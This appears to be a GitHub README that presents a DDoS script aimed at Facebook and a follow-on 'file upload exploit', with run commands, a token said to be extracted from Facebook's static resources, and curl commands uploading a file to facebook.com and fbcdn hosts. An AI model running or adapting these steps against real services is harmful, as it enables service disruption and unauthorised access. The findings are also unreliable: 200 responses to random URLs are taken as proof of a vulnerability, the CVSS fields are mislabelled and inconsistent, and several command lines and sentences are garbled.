# Face
Ddos for Facebook

**Title: Facebook DDoS Through Resource Exhaustion**

**Introduction**

This report details a Distributed Denial of Service (DDoS) attack aimed at Facebook through resource exhaustion. This type of attack overwhelms the target system by flooding it with numerous requests, potentially leading to service disruption or downtime.

**Attack Details**

1. **Description**:
   The provided Python script demonstrates a method to launch a DDoS attack using resource exhaustion. It generates random URLs for Facebook posts and pages, then makes multiple concurrent requests to these URLs to flood the target with traffic.

2. **Script Overview**:
   - **Random Number Generation**: The script generates random 15-digit numbers to create URLs for posts and pages.
   - **User-Agent Rotation**: It rotates between different User-Agent strings to mimic requests from various clients.
   - **Concurrency**: It uses threading to make concurrent requests, further intensifying the attack.
   - **To Use**:
   ```bash
   python3 face.py
   ```

**Potential Impact**

- **Service Disruption**: The primary impact of this attack is the potential for service disruption on Facebook. If the volume of requests is sufficiently high, it could exhaust server resources, leading to degraded performance or downtime.
- **Resource Exhaustion**: The attack aims to consume server resources such as CPU, memory, and network bandwidth.

**Common Weakness Enumeration (CWE)**

- **CWE-400: Uncontrolled Resource Consumption**: This vulnerability involves the use of resources without sufficient control or limitations, leading to potential exhaustion. The DDoS attack script exemplifies this weakness by generating a high volume of requests to overwhelm the server.

**Common Vulnerability Scoring System (CVSS)**

- **CVSS Base Score**: 7.8 (High)
  - **Attack Vector**: Network (N)
  - **Attack Complexity**: Low (L)
  - **Privileges Required**: None (N)
  - **User Interaction**: None (N)
  - **Scope**: Unchanged (U)
  - **Confidentiality Impact**: None (N)
  - **Integrity Impact**: None (N)
  - **Availability Impact**: High (H)

**Mitigation Strategies**

1. **Rate Limiting**: Implement rate limiting to restrict the number of requests from a single IP address or client within a specified timeframe.
2. **Traffic Analysis**: Use traffic analysis and anomaly detection to identify and mitigate unusual spikes in traffic.
3. **DDoS Protection Services**: Deploy dedicated DDoS protection services that can absorb or mitigate large-scale attacks.

**Conclusion**

The script provided is a practical demonstration of how DDoS attacks through resource exhaustion can be executed. Understanding and implementing robust mitigation strategies are crucial for defending against such attacks and maintaining the availability of online services.

![status 200s](https://raw.githubusercontent.com/DeadmanXXXII/Face/main/Screenshot_20240902-180848.png)

![status 200s](https://raw.githubusercontent.com/DeadmanXXXII/Face/main/Screenshot_20240902-180857.png)

![status 200s](https://raw.githubusercontent.com/DeadmanXXXII/Face/main/Screenshot_20240902-182418.png)

![status 200s](https://raw.githubusercontent.com/DeadmanXXXII/Face/main/Screenshot_20240902-182457.png)






# Report Title: Face a DDoS through Resource Exhaustion Leading to Malicious File Upload



#### **Summary**

This report documents the discovery and exploitation of a resource exhaustion vulnerability that led to a malicious file upload. The vulnerability was identified through a series of distributed denial-of-service (DDoS) attacks which eventually revealed a weakness in file upload handling. This led to the crafting of an exploit to upload arbitrary files using forged authentication tokens.


#### **Vulnerability Description**

The vulnerability was uncovered by conducting a resource exhaustion attack through a script (`fb.py`) that made a high volume of HTTP requests using random URLs and request methods. This attack was followed by testing file uploads using different HTTP methods.

### **Analysis of `fb.py` Script**

**Overview:**

The `fb.py` script was used to conduct a resource exhaustion attack against the target by generating a high volume of HTTP requests. This script randomly selects URLs and HTTP methods to flood the server with requests, potentially overwhelming its resources.

**Script Description:**

The `fb.py` script performs the following actions:
1. **Generates Random URLs**: Constructs URLs using random 15-digit numbers appended to a base URL.
2. **Uses Random HTTP Methods**: Chooses between `GET`, `POST`, and `PUT` methods for making requests.
3. **Sets Random User Agents**: Randomly selects user agent strings from a predefined list to simulate various clients.
4. **Creates Concurrent Threads**: Uses multithreading to make 10,000 requests simultaneously, increasing the load on the server.

**Observed Results:**

When running `fb.py`, the script successfully received `HTTP 200 OK` responses for the generated URLs. This indicates that the server processed the requests successfully without rejecting them.

**Detailed Execution:**

Here’s how the script executed:
- **URL Generation**: The script created numerous URLs by appending randomly generated numbers to the base URLs.
- **Request Execution**: Each URL was accessed using randomly selected HTTP methods (`GET`, `POST`, `PUT`), with requests sent in quick succession from multiple threads.
- **Response Handling**: Despite the high volume of requests, the server responded with status code 200, indicating successful request processing.

**Implications:**

The consistent receipt of `HTTP 200 OK` responses suggests that the server did not have adequate protections in place to handle the volume of requests generated by the script. Or it jas an API that accepts arbitrary uploads This implies potential weaknesses in rate limiting or resource management.

**Example Output:**

```
Generated URL for post: https://www.facebook.com/864455789052895/posts/123456789012345 using method: POST
Response code for https://www.facebook.com/864455789052895/posts/123456789012345: 200

Generated URL for page: https://www.facebook.com/123456789012345 using method: GET
Response code for https://www.facebook.com/123456789012345: 200
```

This result indicates that the server was able to handle the flood of requests without immediate adverse effects, suggesting room for improvement in resource management and rate limiting.

**Key Components:**
- **Resource Exhaustion**: The script was designed to flood the target with a large number of HTTP requests, potentially leading to performance degradation or service disruption.
- **File Upload**: Subsequent scripts (`rfufb.py`) attempted to exploit potential weaknesses in file upload mechanisms.

**Final Exploitation**:
- Using a forged authentication token obtained from `Cookie_Monster.py`, file uploads were successfully performed via both `POST` and `PUT` methods.

```bash
python3 Cookie_Monster.py https://static.xx.fbcdn.net/rsrc.php/
```
Auth token found:
QrThZm6BcPBXW3JZdkTN_jWo

```bash
curl -X POST -T sd.py -H "Authorization: Bearer QrThZm6BcPBXW3JZdkTN_jWo" https://facebook.com/rsrc.php/v3 -v
```
```bash
curl -X PUT -T sd.py -H "Authorization: Bearer QrThZm6BcPBXW3JZdkTN_jWo" https://facebook.com/rsrc.php/ -v
```
The reason this is the command is because this.
```bash
1curl -X PUT -T sd.py -H "Authorization: Bearer QrThZm6BcPBXW3JZdkTN_jWo" https://static.xx.fbcdn.net/rsrc.php
```
```bash
curl -X POST -T sd.py -H "Authorization: Bearer QrThZm6BcPBXW3JZdkTN_jWo" https://static.xx.fbcdn.net/rsrc.php
```
Gives a 301 redirect to this https://facebook.com/rsrc.php and /v3 

#### **Impact**

- **CVSS v3.1 Base Score**: 7.5 (High)
- **Vector**: Network (N)
- **Attack Complexity**: Difficult (L)
- **Privileges Required**: None (N)
- **User Interaction**: None (N)
- **Scope**: Unchanged (U)
- **Confidentiality Impact**: High (H)
- **Integrity Impact**: High (H)
- **Availability Impact**: High (H)

**CVSS Vector String**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

#### **CWE ID**

- **CWE-400**: Uncontrolled Resource Consumption ('Resource Exhaustion')
- **CWE-434**: Unrestricted Upload of File with Dangerous Type
- **CWE-326**: Inadequate Encryption Strength (for weak and predictable tokens)

---

#### **Screenshots**

Below are the screenshots relevant to the testing and exploitation phases:

   ![status 200s](https://raw.githubusercontent.com/DeadmanXXXII/Face/main/Screenshot_20240911-142405.png)

   ![Screenshot_20240911-163852](https://raw.githubusercontent.com/DeadmanXXXII/Face/main/Screenshot_20240911-163852.png)
   
   ![Screenshot_20240911-164210](https://raw.githubusercontent.com/DeadmanXXXII/Face/main/Screenshot_20240911-164210.png)

   ![Screenshot_20240911-164227](https://raw.githubusercontent.com/DeadmanXXXII/Face/main/Screenshot_20240911-164227.png)

   ![Screenshot_20240911-163750](https://raw.githubusercontent.com/DeadmanXXXII/Face/main/Screenshot_20240911-163750.png)


#### **Mitigation Recommendations**

1. **Rate Limiting**: Implement rate limiting to prevent excessive request flooding.
2. **Authentication and Authorization**: Enhance authentication mechanisms and ensure proper authorization checks are in place for file uploads.
3. **Input Validation**: Validate and sanitize inputs to avoid arbitrary file uploads and other injection attacks.
4. **File Upload Restrictions**: Restrict file upload capabilities to trusted sources and validate file types and content.
5. **Token Security**: Use strong, unpredictable tokens for authentication to avoid token-related vulnerabilities.

#### **Conclusion**

This report highlights a significant vulnerability exploited through a DDoS attack and subsequent file upload attempts. Implementing recommended mitigations will help in securing the application and preventing similar attacks in the future.
